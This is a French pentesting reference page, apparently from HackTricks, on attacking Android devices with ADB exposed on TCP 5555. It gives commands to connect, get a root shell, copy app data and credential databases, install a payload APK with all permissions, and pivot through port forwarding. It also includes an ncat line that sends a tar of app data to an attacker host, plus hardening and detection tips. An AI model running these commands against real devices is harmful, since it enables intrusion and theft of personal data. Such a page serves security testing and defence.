# 5555 - Android Debug Bridge

{{#include ../banners/hacktricks-training.md}}

## Informations de base

D'après [la documentation](https://developer.android.com/studio/command-line/adb) :

Android Debug Bridge (adb) est un outil en ligne de commande pour communiquer avec des appareils et des émulateurs basés sur Android. Les actions typiques incluent l'installation de paquets, le débogage et l'obtention d'un shell Unix interactif sur l'appareil.

- Port TCP par défaut historique : 5555 (mode classique "adb tcpip").
- Le débogage sans fil moderne (Android 11+) utilise l'appariement TLS et la découverte de services mDNS. Le port de connexion est dynamique et découvert via mDNS ; il peut ne pas être 5555. L'appariement se fait avec adb pair host:port suivi de adb connect. Voir les notes ci-dessous pour les implications offensives.

Exemple d'empreinte nmap :
```
PORT     STATE SERVICE VERSION
5555/tcp open  adb     Android Debug Bridge device (name: msm8909; model: N3; device: msm8909)
```
## Connect

Si vous trouvez ADB exposé et accessible, essayez de vous connecter et d'énumérer rapidement :
```bash
adb connect <ip>[:<port>]      # Default is 5555 for classic mode
adb devices -l                 # Confirm it shows as "device" (not unauthorized/offline)
adb shell                      # Get an interactive shell (uid usually shell)
whoami; id; getprop ro.debuggable ro.secure service.adb.tcp.port
adb root || true               # Works on eng/userdebug/insecure builds, many emulators/IoT
```
- Si l'appareil impose l'authentification ADB (ro.adb.secure=1), vous devrez être pré-autorisés (authentification USB RSA) ou utiliser le couplage de débogage sans fil Android 11+ (ce qui nécessite un code unique affiché sur l'appareil).
- Certaines images de fournisseurs, versions d'ingénierie/userdebug, émulateurs, téléviseurs, STB et kits de développement exposent adbd sans authentification ou avec adbd s'exécutant en tant que root. Dans ces cas, vous atterrirez généralement directement dans un shell ou un shell root.

Pour une référence générale des commandes ADB, voir :

{{#ref}}
../mobile-pentesting/android-app-pentesting/adb-commands.md
{{#endref}}

## Post-Exploitation Rapide

Une fois que vous avez un shell, validez les privilèges et le contexte SELinux :
```bash
id; getenforce; getprop ro.build.type ro.product.model ro.build.fingerprint
```
### Énumérer et capturer des données

- Lister les applications tierces et les chemins :
```bash
pm list packages -3
pm path <pkg>
```
- Si vous avez un accès root (adb root ou su fonctionnent), vous pouvez accéder directement à /data. Sinon, préférez run-as pour les applications débogables :
```bash
# Sans root, pour une application débogable
run-as <pkg> sh -c 'cd /data/data/<pkg> && tar cf - .' | tar xf - -C ./loot/<pkg>

# Avec root
cp -a /data/data/<pkg> /sdcard/<pkg>
exit
adb pull "/sdcard/<pkg>"
```
- Artefacts système utiles (root requis) :
- /data/system/users/0/accounts.db et données AccountManager associées
- /data/misc/wifi/ (configurations/clés réseau sur les anciennes versions)
- DBs SQLite spécifiques à l'application et shared_prefs sous /data/data/<pkg>

Vous pouvez utiliser cela pour récupérer des informations sensibles (par exemple, des secrets d'application). Pour des notes sur les considérations relatives aux données Chrome, voir le problème référencé [ici](https://github.com/carlospolop/hacktricks/issues/274).

### Exécution de code et livraison de payload

- Installer et accorder automatiquement les autorisations d'exécution :
```bash
adb install -r -g payload.apk         # -g accorde toutes les autorisations d'exécution déclarées dans le manifeste
adb shell monkey -p <pkg> -c android.intent.category.LAUNCHER 1
```
- Démarrer des activités/services/broadcasts directement :
```bash
adb shell am start -n <pkg>/<activity>
adb shell am startservice -n <pkg>/<service>
adb shell am broadcast -a <action>
```

### Transfert de port et pivotement

Même sans root, adb peut transférer des ports locaux vers des ports de l'appareil et vice versa. Cela est utile pour accéder à des services liés localement sur l'appareil ou pour exposer des services d'attaquant à l'appareil.

- Transférer hôte->appareil (accéder à un service local à l'appareil depuis votre hôte) :
```bash
adb forward tcp:2222 tcp:22       # Si l'appareil exécute SSH (par exemple, Termux/Dropbear)
adb forward tcp:8081 tcp:8080     # Exposer le serveur de débogage local de l'application
```
- Inverser appareil->hôte (permettre à l'appareil d'atteindre un service sur votre hôte) :
```bash
adb reverse tcp:1080 tcp:1080     # Les applications de l'appareil peuvent maintenant atteindre hôte:1080 comme 127.0.0.1:1080
```
- Exfiltration de fichiers via des sockets (pas d'écritures sur sdcard) :
```bash
# Sur l'hôte : écouter
ncat -lvp 9000 > dump.tar
# Sur l'appareil : envoyer le répertoire sous forme de tar (root ou run-as selon le cas)
adb shell "tar cf - /data/data/<pkg>" | ncat <HOST_IP> 9000
```

## Débogage sans fil (Android 11+)

Android moderne implémente un débogage sans fil protégé par TLS avec appairage côté appareil et découverte mDNS :
```bash
# On the device: Developer options -> Wireless debugging -> Pair device with pairing code
# On attacker host (same L2 network, mDNS allowed):
adb pair <device_ip>:<pair_port>   # Enter the 6-digit code shown on device
adb mdns services                  # Discover _adb-tls-connect._tcp / _adb._tcp services
adb connect <device_ip>:<conn_port>
```
Notes
- Les ports sont dynamiques ; ne supposez pas 5555. Les noms de service mDNS ressemblent à :
- _adb-tls-pairing._tcp (appairage)
- _adb-tls-connect._tcp (connexion appariée)
- _adb._tcp (héritage/plain)
- Si mDNS est filtré, l'activation classique assistée par USB peut encore fonctionner sur certaines versions : `adb tcpip 5555` puis `adb connect <ip>:5555` (jusqu'au redémarrage).

Implications offensives : si vous pouvez interagir avec l'interface utilisateur de l'appareil (par exemple, accès physique ou mauvaise configuration MDM mobile) pour activer le débogage sans fil et voir le code d'appariement, vous pouvez établir un canal ADB apparié à long terme sans câble. Certains OEM exposent ADB sur TCP dans des images d'ingénierie/de développement sans appariement—vérifiez toujours.

## Hardening / Detection

Les défenseurs doivent supposer que tout adbd (TCP) accessible représente un risque critique.

- Désactivez ADB et le débogage sans fil lorsqu'ils ne sont pas nécessaires. Révoquez les autorisations de débogage USB dans les options de développement.
- Assurez-vous que la politique réseau bloque le TCP/5555 entrant et la découverte ADB basée sur mDNS sur des segments non fiables.
- Sur les appareils sous votre contrôle :
```bash
settings put global adb_enabled 0
setprop service.adb.tcp.port -1   # désactiver l'écoute TCP (ou utiliser : adb usb)
stop adbd; start adbd             # redémarrer le démon
```
- Surveillez les enregistrements mDNS `_adb._tcp`, `_adb-tls-connect._tcp`, `_adb-tls-pairing._tcp` sur les réseaux d'entreprise et alertez pour des écouteurs 5555 inattendus.
- Inventaire des versions non sécurisées : `getprop ro.debuggable`, `ro.build.type`, et `ro.adb.secure`.

## Shodan

- android debug bridge
- port:5555 product:"Android Debug Bridge"

## References

- Android Developers – Android Debug Bridge (adb): https://developer.android.com/studio/command-line/adb
- AOSP – ADB over Wi‑Fi, pairing and mDNS service names: https://android.googlesource.com/platform/packages/modules/adb/+/refs/tags/android-vts-15.0_r2/docs/dev/adb_wifi.md
{{#include ../banners/hacktricks-training.md}}
